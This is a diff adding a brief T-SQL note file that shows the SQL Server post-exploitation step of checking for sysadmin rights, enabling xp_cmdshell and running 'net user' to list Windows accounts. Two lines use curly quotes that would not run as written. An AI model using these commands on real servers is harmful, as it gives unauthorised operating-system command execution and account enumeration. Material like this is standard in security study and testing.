@@ -1,0 +1,13 @@
+
+
+SELECT is_srvrolemember(‘sysadmin’);  --To validate if I have admin accces, with the output 1, it's validated
+
+EXEC xp_cmdshell ‘net user’;
+-- Enable advanced options
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+-- Enable xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'net user';
